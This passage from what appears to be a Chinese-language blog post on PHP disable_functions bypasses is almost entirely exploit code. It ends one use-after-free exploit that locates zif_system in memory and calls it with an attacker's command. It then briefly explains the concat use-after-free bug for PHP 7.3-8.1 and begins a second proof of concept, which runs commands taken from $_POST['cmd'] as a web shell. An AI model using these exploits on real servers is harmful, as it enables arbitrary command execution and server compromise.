class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-variable">$e_phoff</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_Write</span><br>                <span class="hljs-comment"># handle pie</span><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_exec</span><br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <span class="hljs-comment"># &#x27;constant&#x27; constant check</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <span class="hljs-comment"># &#x27;bin2hex&#x27; constant check</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123; <span class="hljs-comment"># ELF header</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123; <span class="hljs-comment"># system</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) </span>&#123;<br>        <span class="hljs-comment"># str_shuffle prevents opcache string interning</span><br>        <span class="hljs-variable">$arg</span> = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">79</span>));<br>        <span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuln</span>();<br>        <span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <span class="hljs-comment"># increase this value if UAF fails</span><br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">79</span>));<br><br>    <span class="hljs-title function_ invoke__">trigger_uaf</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">0</span>];<br><br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123; &#125;;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment"># leaks</span><br>    <span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br><br>    <span class="hljs-comment"># fake value</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br><br>    <span class="hljs-comment"># fake reference</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br><br>    <span class="hljs-variable">$closure_obj</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-variable">$binary_leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = <span class="hljs-title function_ invoke__">get_binary_base</span>(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = <span class="hljs-title function_ invoke__">parse_elf</span>(<span class="hljs-variable">$base</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = <span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = <span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment"># fake closure object</span><br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br><br>    <span class="hljs-comment"># pwn</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <span class="hljs-comment"># internal func type</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <span class="hljs-comment"># internal func handler</span><br><br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="php-Concat-UAF（PHP-7-3-8-1）"><a href="#php-Concat-UAF（PHP-7-3-8-1）" class="headerlink" title="php_Concat_UAF（PHP 7.3-8.1）"></a>php_Concat_UAF（PHP 7.3-8.1）</h2><p><strong>利用条件</strong></p><ul><li>Linux 操作系统</li><li>PHP7.3 - all versions to date</li><li>PHP7.4 - all versions to date</li><li>PHP8.0 - all versions to date</li><li>PHP8.1 - all versions to date</li></ul><p><strong>原理</strong></p><p>此漏洞利用了处理字符串连接的函数中的错误。如果满足某些条件，诸如 $a.$b 之类的语句可能会导致内存损坏。错误报告提供了对该漏洞的非常详尽的分析</p><p><a href="https://bugs.php.net/bug.php?id=81705">type confusion&#x2F;UAF on set_error_handler with concat operation</a></p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># PHP 7.3-8.1 disable_functions bypass PoC (*nix only)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Bug: https://bugs.php.net/bug.php?id=81705</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This exploit should work on all PHP 7.3-8.1 versions</span><br><span class="hljs-comment"># released as of 2022-01-07</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Author: https://github.com/mm0r1</span><br><br><span class="hljs-comment">//new Pwn(&quot;uname -a&quot;);</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Pwn</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123; <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>; &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pwn</span> </span>&#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">LOGGING</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CHUNK_DATA_SIZE</span> = <span class="hljs-number">0x60</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CHUNK_SIZE</span> = ZEND_DEBUG_BUILD ? <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">CHUNK_DATA_SIZE</span> + <span class="hljs-number">0x20</span> : <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">CHUNK_DATA_SIZE</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">STRING_SIZE</span> = <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">CHUNK_DATA_SIZE</span> - <span class="hljs-number">0x18</span> - <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">HT_SIZE</span> = <span class="hljs-number">0x118</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">HT_STRING_SIZE</span> = <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">HT_SIZE</span> - <span class="hljs-number">0x18</span> - <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">10</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$groom</span>[] = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">alloc</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">STRING_SIZE</span>);<br>            <span class="hljs-variable">$groom</span>[] = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">alloc</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">HT_STRING_SIZE</span>);<br>        &#125;<br>        <br>        <span class="hljs-variable">$concat_str_addr</span> = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">heap_leak</span>(), <span class="hljs-number">16</span>);<br>        <span class="hljs-variable">$fill</span> = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">alloc</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">STRING_SIZE</span>);<br><br>        <span class="hljs-variable language_">$this</span>-&gt;abc = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">alloc</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">STRING_SIZE</span>);<br>        <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$concat_str_addr</span> + <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">CHUNK_SIZE</span>;<br>        <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;abc @ 0x%x&quot;</span>, <span class="hljs-variable">$abc_addr</span>);<br><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">free</span>(<span class="hljs-variable">$abc_addr</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;helper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;abc) &lt; <span class="hljs-number">0x1337</span>) &#123;<br>            <span class="hljs-built_in">self</span>::<span 